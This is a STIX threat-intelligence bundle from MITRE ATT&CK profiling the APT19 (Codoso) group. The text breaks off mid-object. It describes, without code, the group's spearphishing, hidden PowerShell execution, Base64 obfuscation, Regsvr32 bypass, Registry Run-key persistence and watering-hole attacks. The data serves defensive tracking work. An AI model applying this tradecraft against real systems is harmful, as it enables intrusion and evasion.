{
    "type": "bundle",
    "id": "bundle--1b648f3d-944b-47f1-b701-625d055cb026",
    "spec_version": "2.0",
    "objects": [
        {   "primary_motivation": "organizational-gain",
            "first_seen":"2013",
            "x_MISP-description": "The New York Times described Codoso as: 'A collection of hackers for hire that the security industry has been tracking for years. Over the years, the group has breached banks, law firms and tech companies, and once hijacked the Forbes website to try to infect visitorsâ€™ computers with malware.'",
            "x_MISP-uuid": "103ebfd8-4280-4027-b61a-69bd9967ad6c",
            "type": "intrusion-set",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "name": "APT19",
            "x_mitre_version": "1.4",
            "modified": "2022-06-11T20:10:32.917Z",
            "created_by_ref": "identity--cb4d3609-6db8-40ec-817d-43d0982b9130",
            "aliases": [
                "APT19",
                "Codoso",
                "C0d0so0",
                "Codoso Team",
                "Sunshop Group",
                "Deep Panda",
                "APT 19",
                "Pupa",
                "TG-3551",
                "Bronze Firestone"
            ],
            "id": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) is a Chinese-based threat group that has targeted a variety of industries, including defense, finance, energy, pharmaceutical, telecommunications, high tech, education, manufacturing, and legal services. In 2017, a phishing campaign was used to target seven law and investment firms. (Citation: FireEye APT19) Some analysts track [APT19](https://attack.mitre.org/groups/G0073) and [Deep Panda](https://attack.mitre.org/groups/G0009) as the same group, but it is unclear from open source information if the groups are the same. (Citation: ICIT China's Espionage Jul 2016) (Citation: FireEye APT Groups) (Citation: Unit 42 C0d0so0 Jan 2016)",
            "x_mitre_contributors": [
                "FS-ISAC",
                "Darren Spruell"
            ],
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "mitre-attack",
                    "external_id": "G0073",
                    "url": "https://attack.mitre.org/groups/G0073"
                },
                {
                    "description": "(Citation: FireEye APT19)",
                    "source_name": "APT19"
                },
                {
                    "description": "(Citation: Unit 42 C0d0so0 Jan 2016)",
                    "source_name": "Codoso"
                },
                {
                    "description": "(Citation: Unit 42 C0d0so0 Jan 2016)",
                    "source_name": "C0d0so0"
                },
                {
                    "description": "(Citation: FireEye APT Groups)",
                    "source_name": "Codoso Team"
                },
                {
                    "description": "(Citation: Dark Reading Codoso Feb 2015)",
                    "source_name": "Sunshop Group"
                },
                {
                    "source_name": "FireEye APT19",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
                },
                {
                    "source_name": "ICIT China's Espionage Jul 2016",
                    "description": "Scott, J. and Spaniel, D. (2016, July 28). ICIT Brief - China\u2019s Espionage Dynasty: Economic Death by a Thousand Cuts. Retrieved June 7, 2018.",
                    "url": "https://web.archive.org/web/20171017072306/https://icitech.org/icit-brief-chinas-espionage-dynasty-economic-death-by-a-thousand-cuts/"
                },
                {
                    "url": "https://www.fireeye.com/current-threats/apt-groups.html#apt19",
                    "description": "FireEye. (n.d.). Advanced Persistent Threat Groups. Retrieved August 3, 2018.",
                    "source_name": "FireEye APT Groups"
                },
                {
                    "source_name": "Unit 42 C0d0so0 Jan 2016",
                    "description": "Grunzweig, J., Lee, B. (2016, January 22). New Attacks Linked to C0d0so0 Group. Retrieved August 2, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/"
                },
                {
                    "url": "https://www.darkreading.com/attacks-breaches/chinese-hacking-group-codoso-team-uses-forbescom-as-watering-hole-/d/d-id/1319059",
                    "description": "Chickowski, E. (2015, February 10). Chinese Hacking Group Codoso Team Uses Forbes.com As Watering Hole. Retrieved September 13, 2018.",
                    "source_name": "Dark Reading Codoso Feb 2015"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--1ed35fc6-ea81-4669-9fd3-997422febe09",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) used TCP port 80 for C2.(Citation: FireEye APT19)",
            "target_ref": "attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e",
            "modified": "2019-04-25T11:39:52.056Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "FireEye APT19",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--2e6e8722-d09d-402e-9ea8-ccf8412339d0",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) used <code>-W Hidden</code> to conceal [PowerShell](https://attack.mitre.org/techniques/T1059/001) windows by setting the WindowStyle parameter to hidden. (Citation: FireEye APT19)",
            "target_ref": "attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0",
            "modified": "2021-02-09T13:56:35.269Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2019-10-10T22:00:27.892Z",
            "external_references": [
                {
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "source_name": "FireEye APT19"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--3bcfc38f-5fe8-4c66-8352-d3ba71c4f3ec",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) configured its payload to inject into the rundll32.exe.(Citation: FireEye APT19)",
            "target_ref": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
            "modified": "2019-04-25T11:39:52.119Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "FireEye APT19",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--4a6c44ec-a1de-4fbc-88ef-d3003137a2fc",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) used HTTP for C2 communications. [APT19](https://attack.mitre.org/groups/G0073) also used an HTTP malware variant to communicate over HTTP for C2.(Citation: FireEye APT19)(Citation: Unit 42 C0d0so0 Jan 2016)",
            "target_ref": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
            "modified": "2020-03-17T00:05:25.628Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "FireEye APT19",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
                },
                {
                    "source_name": "Unit 42 C0d0so0 Jan 2016",
                    "description": "Grunzweig, J., Lee, B. (2016, January 22). New Attacks Linked to C0d0so0 Group. Retrieved August 2, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--4f2e62d0-5345-45dc-9e9d-46bb11c5f35d",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) downloaded and launched code within a SCT file.(Citation: FireEye APT19)",
            "target_ref": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
            "modified": "2020-03-17T18:25:45.809Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "FireEye APT19",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--5f830006-234e-44d1-9441-1aca7990006c",
            "description": "(Citation: FireEye APT19)",
            "target_ref": "malware--a7881f21-e978-4fe4-af56-92c9416a2616",
            "modified": "2020-11-06T18:40:38.335Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2020-11-06T18:40:38.335Z",
            "external_references": [
                {
                    "source_name": "FireEye APT19",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--45f35ec0-73a8-42a6-b879-d800d27211c8",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) uses a Port 22 malware variant to modify several Registry keys.(Citation: Unit 42 C0d0so0 Jan 2016)",
            "target_ref": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4",
            "modified": "2019-04-25T11:39:52.197Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "Unit 42 C0d0so0 Jan 2016",
                    "description": "Grunzweig, J., Lee, B. (2016, January 22). New Attacks Linked to C0d0so0 Group. Retrieved August 2, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--59cccc5a-f6f9-4a2f-aa74-2b7235b1855c",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) used Base64 to obfuscate commands and the payload.(Citation: FireEye APT19)",
            "target_ref": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
            "modified": "2019-04-25T11:39:52.245Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "FireEye APT19",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--89b157e1-3972-421e-87c9-f9e83b26ec90",
            "description": "(Citation: NCSC Joint Report Public Tools)",
            "target_ref": "tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3",
            "modified": "2021-01-25T15:43:46.054Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2019-03-12T16:19:09.902Z",
            "external_references": [
                {
                    "source_name": "NCSC Joint Report Public Tools",
                    "description": "The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019.",
                    "url": "https://www.ncsc.gov.uk/report/joint-report-on-publicly-available-hacking-tools"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--331ebf73-af72-4121-815a-d10392ac75ab",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) used an HTTP malware variant and a Port 22 malware variant to collect the victim\u2019s username.(Citation: Unit 42 C0d0so0 Jan 2016)",
            "target_ref": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
            "modified": "2019-04-25T11:39:52.152Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "Unit 42 C0d0so0 Jan 2016",
                    "description": "Grunzweig, J., Lee, B. (2016, January 22). New Attacks Linked to C0d0so0 Group. Retrieved August 2, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--478f7f77-6b6b-4949-ac87-f28419b5e2ab",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) performed a watering hole attack on forbes.com in 2014 to compromise targets.(Citation: Unit 42 C0d0so0 Jan 2016)",
            "target_ref": "attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6",
            "modified": "2019-04-25T11:39:52.237Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "Unit 42 C0d0so0 Jan 2016",
                    "description": "Grunzweig, J., Lee, B. (2016, January 22). New Attacks Linked to C0d0so0 Group. Retrieved August 2, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--818b440b-075d-483d-83ff-9991a78e25f4",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.(Citation: FireEye APT19)",
            "target_ref": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
            "modified": "2019-04-25T11:39:52.234Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "FireEye APT19",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--1219cbd2-26b8-4a2e-bbf1-477afc396203",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) used PowerShell commands to execute payloads.(Citation: FireEye APT19)",
            "target_ref": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
            "modified": "2019-04-25T11:39:52.194Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "FireEye APT19",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--04558d61-aa04-46b5-a65f-921011ac9621",
            "description": "An [APT19](https://attack.mitre.org/groups/G0073) HTTP malware variant establishes persistence by setting the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools-%LOCALAPPDATA%\\</code>.(Citation: Unit 42 C0d0so0 Jan 2016)",
            "target_ref": "attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279",
            "modified": "2019-04-25T11:39:52.147Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "Unit 42 C0d0so0 Jan 2016",
                    "description": "Grunzweig, J., Lee, B. (2016, January 22). New Attacks Linked to C0d0so0 Group. Retrieved August 2, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--4999a323-b025-4a1d-8c80-5ae36b2f5a0d",
            "description": "An [APT19](https://attack.mitre.org/groups/G0073) Port 22 malware variant registers itself as a service.(Citation: Unit 42 C0d0so0 Jan 2016)",
            "target_ref": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
            "modified": "2019-04-25T11:39:52.243Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "Unit 42 C0d0so0 Jan 2016",
                    "description": "Grunzweig, J., Lee, B. (2016, January 22). New Attacks Linked to C0d0so0 Group. Retrieved August 2, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--322703cc-c8f9-4046-8a61-e165a2d11bc7",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim\u2019s machine.(Citation: Unit 42 C0d0so0 Jan 2016)",
            "target_ref": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
            "modified": "2019-04-25T11:39:52.002Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "Unit 42 C0d0so0 Jan 2016",
                    "description": "Grunzweig, J., Lee, B. (2016, January 22). New Attacks Linked to C0d0so0 Group. Retrieved August 2, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--b033e131-e448-46c6-815b-b86e4bd6d638",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) attempted to get users to launch malicious attachments delivered via spearphishing emails.(Citation: FireEye APT19)",
            "target_ref": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
            "modified": "2020-03-12T00:28:05.750Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "FireEye APT19",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--c3d9182c-178b-4d8d-91d8-f4d1313738bb",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) collected system architecture information. [APT19](https://attack.mitre.org/groups/G0073) used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim\u2019s machine.(Citation: FireEye APT19)(Citation: Unit 42 C0d0so0 Jan 2016)",
            "target_ref": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
            "modified": "2019-04-25T11:39:52.117Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "FireEye APT19",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
                },
                {
                    "source_name": "Unit 42 C0d0so0 Jan 2016",
                    "description": "Grunzweig, J., Lee, B. (2016, January 22). New Attacks Linked to C0d0so0 Group. Retrieved August 2, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--d1b46f3e-b25c-43c0-9ab2-ef6e5ff8270c",
            "description": "An [APT19](https://attack.mitre.org/groups/G0073) HTTP malware variant used Base64 to encode communications to the C2 server.(Citation: Unit 42 C0d0so0 Jan 2016)",
            "target_ref": "attack-pattern--04fd5427-79c7-44ea-ae13-11b24778ff1c",
            "modified": "2020-03-20T18:02:57.179Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "Unit 42 C0d0so0 Jan 2016",
                    "description": "Grunzweig, J., Lee, B. (2016, January 22). New Attacks Linked to C0d0so0 Group. Retrieved August 2, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--e6b509c8-0e00-48ac-b76d-f42d18a0ae51",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) has obtained and used publicly-available tools like [Empire](https://attack.mitre.org/software/S0363).(Citation: NCSC Joint Report Public Tools)(Citation: FireEye APT19)",
            "target_ref": "attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0",
            "modified": "2021-05-26T12:38:01.263Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2021-05-26T12:38:01.263Z",
            "external_references": [
                {
                    "source_name": "NCSC Joint Report Public Tools",
                    "description": "The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019.",
                    "url": "https://www.ncsc.gov.uk/report/joint-report-on-publicly-available-hacking-tools"
                },
                {
                    "source_name": "FireEye APT19",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--f35a3ca7-b916-4bc2-a493-613196b5d41e",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.(Citation: Unit 42 C0d0so0 Jan 2016)",
            "target_ref": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b",
            "modified": "2019-04-25T11:39:52.189Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "Unit 42 C0d0so0 Jan 2016",
                    "description": "Grunzweig, J., Lee, B. (2016, January 22). New Attacks Linked to C0d0so0 Group. Retrieved August 2, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--f84b2658-a891-45a8-93ff-14dc0a86df10",
            "description": "An [APT19](https://attack.mitre.org/groups/G0073) HTTP malware variant decrypts strings using single-byte XOR keys.(Citation: Unit 42 C0d0so0 Jan 2016)",
            "target_ref": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
            "modified": "2019-04-25T11:39:52.241Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "Unit 42 C0d0so0 Jan 2016",
                    "description": "Grunzweig, J., Lee, B. (2016, January 22). New Attacks Linked to C0d0so0 Group. Retrieved August 2, 2018.",
                    "url": "https://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "relationship",
            "id": "relationship--f832e042-6859-4415-9b6c-4e093dc955ec",
            "description": "[APT19](https://attack.mitre.org/groups/G0073) used Regsvr32 to bypass application control techniques.(Citation: FireEye APT19)",
            "target_ref": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
            "modified": "2020-06-20T22:48:29.688Z",
            "source_ref": "intrusion-set--fe8796a4-2a02-41a0-9d27-7aa1e995feb6",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "relationship_type": "uses",
            "created": "2018-10-17T00:14:20.652Z",
            "external_references": [
                {
                    "source_name": "FireEye APT19",
                    "description": "Ahl, I. (2017, June 06). Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 17, 2018.",
                    "url": "https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2020-03-26T20:15:35.821Z",
            "name": "Web Protocols",
            "x_mitre_data_sources": [
                "Network Traffic: Network Traffic Flow",
                "Network Traffic: Network Traffic Content"
            ],
            "x_mitre_version": "1.0",
            "created": "2020-03-15T16:13:46.151Z",
            "x_mitre_platforms": [
                "Linux",
                "macOS",
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
